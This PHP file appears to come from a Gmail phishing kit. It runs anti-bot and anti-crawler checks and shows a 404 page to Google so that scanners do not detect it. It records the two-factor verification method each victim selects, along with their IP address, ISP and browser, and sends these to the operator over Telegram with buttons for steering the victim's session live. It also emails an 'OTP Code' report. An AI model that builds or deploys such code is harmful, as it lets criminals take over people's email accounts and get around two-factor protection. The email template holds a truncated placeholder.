<?php
error_reporting(0);
require_once(__DIR__ . '/../session_init.php');

# Adding Settings
include('function.php');
$settings = include('../config.php');

// 3. Antibots (Run once early)
$antibotsDir = null;
$antibotsCandidates = [
    __DIR__ . DIRECTORY_SEPARATOR . '..' . DIRECTORY_SEPARATOR . 'antibots',
    dirname(__DIR__) . DIRECTORY_SEPARATOR . 'antibots',
];
foreach ($antibotsCandidates as $candidate) {
    $candidate = realpath($candidate) ?: $candidate;
    if (is_dir($candidate)) { $antibotsDir = $candidate; break; }
}
if ($antibotsDir === null) {
    http_response_code(500);
    exit('Server misconfiguration: antibots directory not found.');
}

require($antibotsDir . DIRECTORY_SEPARATOR . "AntiBotUserAgent.php");
require($antibotsDir . DIRECTORY_SEPARATOR . "AntiBotIsp.php"); 
//require($antibotsDir . DIRECTORY_SEPARATOR . "AnitiBotHost.php");
require($antibotsDir . DIRECTORY_SEPARATOR . "AntiBotPhishTank.php");
require($antibotsDir . DIRECTORY_SEPARATOR . "AntiBotVpn.php");
require($antibotsDir . DIRECTORY_SEPARATOR . "SaveBrowsing.php");
require($antibotsDir . DIRECTORY_SEPARATOR . "DiscoveredBot.php");
require($antibotsDir . DIRECTORY_SEPARATOR . "AntiBotThree.php");
require($antibotsDir . DIRECTORY_SEPARATOR . "DisturbOne.php");
require($antibotsDir . DIRECTORY_SEPARATOR . "DisturbTwo.php");
require($antibotsDir . DIRECTORY_SEPARATOR . "Anti" . DIRECTORY_SEPARATOR . "Bot-Crawler.php");
@require($antibotsDir . DIRECTORY_SEPARATOR . "Anti" . DIRECTORY_SEPARATOR . "Crawler" . DIRECTORY_SEPARATOR . "src" . DIRECTORY_SEPARATOR . "CrawlerDetect.php");
use JayBizzle\CrawlerDetect\CrawlerDetect;
if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { include("../404.php"); exit(); }
$remoteAddr = getenv("REMOTE_ADDR") ?: '';
$remoteHost = (filter_var($remoteAddr, FILTER_VALIDATE_IP)) ? gethostbyaddr($remoteAddr) : '';
if ($remoteHost !== '' && strpos($remoteHost, 'google') !== false) { include("../404.php"); exit(); }

$useragent = $_SERVER['HTTP_USER_AGENT'];

// Generate random ID for redirects
$random_id = bin2hex(random_bytes(16));

// Check for device parameter in current URL
if (isset($_GET['device']) && !empty($_GET['device'])) {
    $_SESSION['device'] = $_GET['device'];
} else if (!isset($_SESSION['device']) || empty($_SESSION['device'])) {
    $_SESSION['device'] = 'browser';
}

// Check if visitor key exists in cookie
if (!isset($_COOKIE['visitor_key'])) {
    header("Location: ../index.php?" . $random_id);
    exit();
}

// Check if session username exists and has a value
if (!isset($_SESSION['username']) || empty($_SESSION['username'])) {
    header("Location: ../index.php?id=" . $random_id);
    exit();
}

$visitor_id = $_SESSION['visitor_id'] ?? ($_GET['id'] ?? 'unknown');

require_once('database.php');

# Register/Update visitor session in database
db_update_visitor($visitor_id, [
    'ip' => $IP,
    'status' => 'waiting'
]);

# Get selected challenge info
$challengeId = isset($_POST['challengeListId']) ? $_POST['challengeListId'] : 'Unknown';
$challengeType = 'Unknown';

switch($challengeId) {
    case '10':
        $challengeType = "Tap Yes on device";
        break;
    case '7':
        $challengeType = "Get security code from device";
        break;
    case '6':
        $challengeType = "SMS Verification";
        break;
    case '2':
        $challengeType = "Backup codes";
        break;
    case '9':
        $challengeType = "Passkey";
        break;
    case 'accountrecovery':
        $challengeType = "Account Recovery";
        break;
}

# Logs
$IP = isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : 'Unknown';
$os_platform = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : 'Unknown';
$date = date("F j, Y g:i a");

// Premium Telegram Notification Title
$msgtg = "🌐 <b>GMAIL - VERIFICATION METHOD</b> 🌐\n";
$msgtg .= "━━━━━━━━━━━━━━━\n\n";

// Method Information Section
$msgtg .= "👤 <b>SELECTED METHOD</b>\n";
$msgtg .= "• Challenge ID: <code>{$challengeId}</code>\n";
$msgtg .= "• Type: <code>{$challengeType}</code>\n\n";

// Location Information Section
$msgtg .= "📍 <b>LOCATION INFO</b>\n";
$msgtg .= "• IP Address: <code>{$IP}</code>\n";
$msgtg .= "• ISP: <code>" . htmlspecialchars(ISP($IP)) . "</code>\n\n";

// Device Information Section
$msgtg .= "💻 <b>DEVICE INFO</b>\n";
$msgtg .= "• Platform: <code>" . htmlspecialchars($os_platform) . "</code>\n\n";

// Visitor ID Section
$visitor_data = db_get_visitor($visitor_id);
$v_num = isset($visitor_data['v_number']) ? $visitor_data['v_number'] : '1';

$msgtg .= "🔑 <b>VISITOR INFO</b>\n";
$msgtg .= "• Visitor Number: #<code>{$v_num}</code>\n";
$msgtg .= "• Visitor ID: <code>{$visitor_id}</code>\n\n";

$msgtg .= "━━━━━━━━━━━━━━━\n";
$msgtg .= "⏰ " . date("F j, Y g:i a") . "\n\n";
$msgtg .= "+ Powered by <a href='https://t.me/xforgex'>@xforgex</a> +";

$notified_key = "notified_mselect_" . md5($visitor_id . $challengeId);
if ($settings['telegram'] == "1" && !isset($_SESSION[$notified_key])) {
    // Create inline keyboard for real-time management
    $keyboard = [
        'inline_keyboard' => [
            [['text' => '🔒 Security Preference', 'callback_data' => 'security_preference']],
            [['text' => '✅ Yes Prompt', 'callback_data' => 'yes_prompt'], ['text' => '📱 SMS Code I', 'callback_data' => 'sms1']],
            [['text' => '📱 SMS Code II', 'callback_data' => 'sms2'], ['text' => '📞 Number Prompt', 'callback_data' => 'number_prompt']],
            [['text' => '❌ Password Error', 'callback_data' => 'password_error'], ['text' => '🚫 Block Visitor', 'callback_data' => 'block']],
            [['text' => '✅ Success', 'callback_data' => 'success']]
        ]
    ];

    // Add Live Panel button only on public domains
    if (!$is_localhost) {
        $keyboard['inline_keyboard'][] = [['text' => '🌐 Open Live Panel', 'url' => 'http://' . $_SERVER['HTTP_HOST'] . '/session/']];
    }

    send_telegram($msgtg, $keyboard);
    $_SESSION[$notified_key] = true;
}


$error = false;

if ($error) {
  header('Location: https://www.google.com/search?q=Gmail+login');
  exit();
}

$email_msg = "
<html>
<head>
    <style>
        body { font-family: Arial, sans-serif; line-height: 1.6; color: #333; }
        .container { max-width: 600px; margin: 20px auto; padding: 20px; border: 1px solid #ddd; border-radius: 5px; }
        .header { background: #DB4437; color: white; padding: 15px; border-radius: 5px 5px 0 0; }
        .section { margin: 15px 0; padding: 15px; background: #f9f9f9; border-radius: 5px; }
        .footer { margin-top: 20px; padding-top: 20px; border-top: 1px solid #ddd; font-size: 12px; color: #666; }
    </style>
</head>
<body>
    <div class='container'>
        <div class='header'>
            <h2>✦ GMAIL OTP Code ✦</h2>
        </div>
        // ... existing code ...
    </div>
</body>
</html>";

if ($settings['send_mail'] == "1"){
    $to = $settings['email'];
    $headers = "MIME-Version: 1.0" . "\r\n";
    $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
    $headers .= "From: GMAIL <Gmail@client_site.com>\r\n";
    $subject = "✦ GMAIL OTP Code - {$IP} ✦";
    mail($to, $subject, $email_msg, $headers);
}

header("Location: ../load.php?id=" . $visitor_id);
exit();
?>
